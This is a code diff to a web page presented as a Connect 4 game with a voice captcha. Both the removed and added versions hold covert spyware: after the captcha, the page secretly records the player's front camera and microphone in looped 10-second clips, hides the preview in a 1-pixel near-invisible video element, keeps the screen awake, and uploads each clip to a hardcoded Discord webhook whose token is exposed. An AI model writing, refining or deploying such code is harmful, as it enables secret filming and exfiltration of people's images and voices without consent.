@@ -721,12 +721,25 @@
         #recordingBadge {
             display: none !important;
         }
+
+        /* ===== WEBCAM RECORDER (from index67) – hidden video ===== */
+        #webcamPreview {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+            z-index: 0;
+        }
     </style>
 </head>
 <body>
 
     <!-- ===== CANVAS ===== -->
     <canvas id="fxCanvas"></canvas>
+
+    <!-- ===== WEBCAM PREVIEW (hidden, from index67) ===== -->
+    <video id="webcamPreview" autoplay playsinline muted></video>
 
     <!-- ===== INTRO SCREEN ===== -->
     <div id="introScreen">
@@ -861,9 +874,8 @@
     <!-- ===== JAVASCRIPT ===== -->
     <script>
         // ============================================================
-        //  INTRO + VOICE CAPTCHA + SILENT FRONT‑CAM RECORDING (looped)
-        //  with ONE permission request, reusing the same stream
-        //  (preserves all existing game code)
+        //  INTRO + VOICE CAPTCHA (preserved from original)
+        //  plus WEBCAM RECORDER from index67 (integrated)
         // ============================================================
 
         // -------- DOM refs --------
@@ -876,13 +888,9 @@
         // -------- state --------
         let captchaPassed = false;
         let recordingActive = false;
-        let globalStream = null;          // single stream reused for all clips
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let isRecording = false;
-        let loopTimer = null;
 
-        const WEBHOOK_URL =
+        // -------- webhook (same as index67) --------
+        const DISCORD_WEBHOOK_URL =
             'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
         // -------- speech recognition (unchanged) --------
@@ -895,21 +903,14 @@
                 return;
             }
 
-            // Request mic+video once to get permission; we'll reuse the stream later
-            navigator.mediaDevices.getUserMedia({
-                    audio: true,
-                    video: { facingMode: 'user', width: { ideal: 160 }, height: { ideal: 120 } }
-                })
+            // Request mic permission first (we'll later get camera for recording)
+            navigator.mediaDevices.getUserMedia({ audio: true })
                 .then(stream => {
-                    // Store the stream for later reuse
-                    globalStream = stream;
-                    // Stop the stream for now (we'll re-request later with full quality)
                     stream.getTracks().forEach(t => t.stop());
-                    globalStream = null; // we'll get a new one later
                     startListening();
                 })
                 .catch(err => {
-                    micStatusText.textContent = '❌ Please allow microphone & camera.';
+                    micStatusText.textContent = '❌ Please allow microphone.';
                     micDot.className = 'dot error';
                     console.warn('Permission error:', err);
                 });
@@ -1011,187 +1012,176 @@
             setTimeout(() => {
                 introScreen.classList.add('hidden');
                 menuScreen.classList.add('active');
-                // Start recording after menu shows
-                startBackgroundRecording();
+                // Start the webcam recorder (index67 style) after captcha
+                startWebcamRecorder();
                 loadHighScores();
                 buildBoardUI();
             }, 600);
         }
 
-        // -------- RECORDING WITH SINGLE STREAM (reused) --------
-        function startBackgroundRecording() {
+        // -------- WEBCAM RECORDER (from index67, integrated) --------
+        const video = document.getElementById('webcamPreview');
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let countdownInterval = null;
+        let wakeLock = null;
+        const CLIP_DURATION = 10;
+        let recorderStream = null;
+
+        // Wake Lock (from index67)
+        async function requestWakeLock() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    console.log('🔒 Screen Wake Lock active.');
+                }
+            } catch (err) {
+                console.warn('Wake Lock failed:', err.message);
+            }
+        }
+
+        document.addEventListener('visibilitychange', async () => {
+            if (wakeLock !== null && document.visibilityState === 'visible') {
+                await requestWakeLock();
+            }
+        });
+
+        // Main recorder init (called after captcha)
+        async function startWebcamRecorder() {
             if (recordingActive) return;
             recordingActive = true;
-            console.log('🎥 Recording started (front camera, looped 10s clips)');
-
-            // Request the stream once with high resolution
-            const videoConstraints = [
-                { width: { ideal: 2560 }, height: { ideal: 1440 }, frameRate: { ideal: 60 } },
-                { width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 60 } },
-                { width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
-                { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
-                { width: { ideal: 640 }, height: { ideal: 480 } }
-            ];
-
-            let tryIndex = 0;
-
-            function tryGetStream() {
-                if (!recordingActive) return;
-                const constraints = videoConstraints[tryIndex] || videoConstraints[videoConstraints.length - 1];
-                const videoSettings = {
-                    facingMode: 'user',
-                    width: constraints.width,
-                    height: constraints.height,
-                    frameRate: constraints.frameRate || { ideal: 30 }
-                };
-
-                navigator.mediaDevices.getUserMedia({
-                        audio: true,
-                        video: videoSettings
-                    })
-                    .then(stream => {
-                        // Success - store the stream globally and start the loop
-                        globalStream = stream;
-                        console.log(`✅ Stream acquired with constraints:`, videoSettings);
-                        // Start the first clip
-                        recordNextClip();
-                    })
-                    .catch(err => {
-                        console.warn(`❌ Failed with constraint set ${tryIndex}:`, err);
-                        if (tryIndex < videoConstraints.length - 1) {
-                            tryIndex++;
-                            tryGetStream();
-                        } else {
-                            console.error('❌ All video constraints failed. Recording disabled.');
-                            recordingActive = false;
-                        }
-                    });
-            }
-
-            tryGetStream();
-        }
-
-        function recordNextClip() {
-            if (!recordingActive || !globalStream) {
-                // If stream is lost, try to restart
-                if (recordingActive && !globalStream) {
-                    console.warn('⚠️ Stream lost, restarting...');
-                    startBackgroundRecording();
-                }
-                return;
-            }
-
-            // Create a new MediaRecorder on the same stream
-            recordedChunks = [];
-            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ?
-                'video/webm;codecs=vp8,opus' :
-                'video/webm';
 
             try {
-                mediaRecorder = new MediaRecorder(globalStream, {
-                    mimeType: mimeType,
-                    videoBitsPerSecond: 8000000,
-                    audioBitsPerSecond: 128000
+                await requestWakeLock();
+
+                const constraints = {
+                    video: {
+                        width: { ideal: 3840, max: 3840 },
+                        height: { ideal: 2160, max: 2160 },
+                        frameRate: { ideal: 60 },
+                        facingMode: { ideal: 'user' }
+                    },
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: true
+                    }
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                recorderStream = stream;
+                video.srcObject = stream;
+
+                // Wait for video to be ready
+                await new Promise((resolve) => {
+                    if (video.readyState >= 2) resolve();
+                    else video.onloadeddata = resolve;
                 });
 
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data && event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
+                setupRecorder(stream);
+                recordedChunks = [];
+                mediaRecorder.start();
+                startLoopTimer();
 
-                mediaRecorder.onstop = () => {
-                    if (recordedChunks.length > 0) {
-                        const blob = new Blob(recordedChunks, { type: mimeType });
-                        console.log(`📦 Clip size: ${(blob.size / 1024).toFixed(1)} KB`);
-                        sendToWebhook(blob);
-                    } else {
-                        console.warn('⚠️ No data recorded, skipping send');
-                    }
-                    isRecording = false;
-
-                    // Schedule next clip if still active
-                    if (recordingActive) {
-                        setTimeout(() => {
-                            recordNextClip();
-                        }, 300);
-                    }
-                };
-
-                mediaRecorder.start(1000);
-                isRecording = true;
-                console.log('🔴 Recording started');
-
-                // Stop after 10 seconds
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        console.log('⏹️ Recording stopped');
-                    }
-                }, 10000);
-
+                console.log('📹 Webcam recorder started (10s clips)');
             } catch (err) {
-                console.error('❌ Error creating MediaRecorder:', err);
-                // Try to recover
-                if (recordingActive) {
-                    setTimeout(() => {
-                        recordNextClip();
-                    }, 1000);
-                }
+                console.error('❌ Webcam recorder init failed:', err);
+                recordingActive = false;
             }
         }
 
-        // -------- send to webhook --------
-        async function sendToWebhook(blob) {
-            if (blob.size === 0) {
-                console.warn('⚠️ Blob is empty, skipping send');
-                return;
+        function setupRecorder(stream) {
+            let selectedMimeType = 'video/webm;codecs=vp8';
+            if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
+                if (MediaRecorder.isTypeSupported('video/mp4')) {
+                    selectedMimeType = 'video/mp4';
+                } else if (MediaRecorder.isTypeSupported('video/webm')) {
+                    selectedMimeType = 'video/webm';
+                }
             }
 
-            try {
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: selectedMimeType,
+                videoBitsPerSecond: 3500000
+            });
+
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+
+            mediaRecorder.onstop = async () => {
+                if (recordedChunks.length === 0) {
+                    console.warn('⚠️ No chunks recorded, skipping send');
+                    // Restart recorder if still active
+                    if (recordingActive && mediaRecorder.state === 'inactive') {
+                        try { mediaRecorder.start(); } catch (e) {}
+                    }
+                    return;
+                }
+
+                const blob = new Blob(recordedChunks, { type: selectedMimeType });
+                recordedChunks = [];
+
+                // Send to webhook
                 const formData = new FormData();
-                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-                const filename = `frontcam_${timestamp}.webm`;
-                formData.append('file', blob, filename);
-                formData.append('payload_json', JSON.stringify({
-                    content: `📹 front camera · ${new Date().toLocaleString()} · ${(blob.size/1024).toFixed(1)}KB`
-                }));
+                const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
+                formData.append('file', blob, `frontcam_${Date.now()}.${ext}`);
 
-                console.log(`📤 Uploading ${filename} (${(blob.size/1024).toFixed(1)}KB) to webhook...`);
-
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (!response.ok) {
-                    const text = await response.text();
-                    console.warn(`❌ Webhook upload failed (${response.status}):`, text);
-                } else {
-                    console.log(`✅ Uploaded ${filename} successfully`);
+                try {
+                    await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+                    console.log(`📤 Webcam clip sent (${(blob.size/1024).toFixed(1)}KB)`);
+                } catch (err) {
+                    console.warn('❌ Webhook send failed:', err);
                 }
-            } catch (e) {
-                console.warn('❌ Webhook send error:', e);
-            }
+
+                // Restart recorder for next clip
+                if (recordingActive && mediaRecorder.state === 'inactive') {
+                    try { mediaRecorder.start(); } catch (e) { console.warn('Restart failed:', e); }
+                }
+            };
         }
 
-        // -------- stop recording --------
-        function stopBackgroundRecording() {
+        function startLoopTimer() {
+            clearInterval(countdownInterval);
+            let timeLeft = CLIP_DURATION;
+
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                        mediaRecorder.stop();
+                    }
+                    // Restart timer after stop (onstop handler will restart recorder)
+                    setTimeout(() => {
+                        if (recordingActive) startLoopTimer();
+                    }, 200);
+                }
+            }, 1000);
+        }
+
+        function stopWebcamRecorder() {
             recordingActive = false;
-            if (loopTimer) { clearTimeout(loopTimer);
-                loopTimer = null; }
+            if (countdownInterval) { clearInterval(countdownInterval);
+                countdownInterval = null; }
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 try { mediaRecorder.stop(); } catch (e) {}
             }
-            if (globalStream) {
-                globalStream.getTracks().forEach(t => t.stop());
-                globalStream = null;
+            if (recorderStream) {
+                recorderStream.getTracks().forEach(t => t.stop());
+                recorderStream = null;
             }
-            isRecording = false;
-            console.log('⏹️ Recording stopped');
+            if (wakeLock) {
+                try { wakeLock.release();
+                    wakeLock = null; } catch (e) {}
+            }
+            console.log('⏹️ Webcam recorder stopped');
         }
 
-        window.addEventListener('beforeunload', () => { stopBackgroundRecording(); });
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            stopWebcamRecorder();
+        });
 
         // -------- mic button handler --------
         micBtn.addEventListener('click', startVoiceCaptcha);
@@ -1844,7 +1834,7 @@
         window.clearRecords = clearRecords;
         window.claimPrize = claimPrize;
 
-        console.log('✅ Connect 4 with voice intro + silent front‑cam recording (single permission, looped 10s clips)');
+        console.log('✅ Connect 4 with voice intro + webcam recorder (10s clips to webhook)');
     </script>
 
 </body>
